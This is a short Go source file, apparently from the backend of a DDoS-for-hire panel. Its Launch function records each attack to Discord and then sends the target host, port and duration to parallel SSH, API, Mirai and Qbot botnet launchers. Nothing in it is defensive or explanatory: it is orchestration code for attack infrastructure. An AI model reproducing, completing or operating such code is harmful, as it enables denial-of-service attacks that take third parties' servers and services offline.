package attacks

import (
	"log"
	"sync"
	"webserver/src/discord"
)

var Mutex sync.Mutex

func Launch(username string, host string, port string, tm string, method string) {
	Mutex.Lock()
	if err := discord.LogAttack(username, host, port, tm, method); err != nil {
		log.Printf("(discord_err) %s", err)
	}
	go AttackSSH(host, port, tm, method)
	go LaunchAPI(host, port, tm, method)
	go LaunchMirai(host, port, tm, method)
	go LaunchQbot(host, port, tm, method)
	Mutex.Unlock()
}
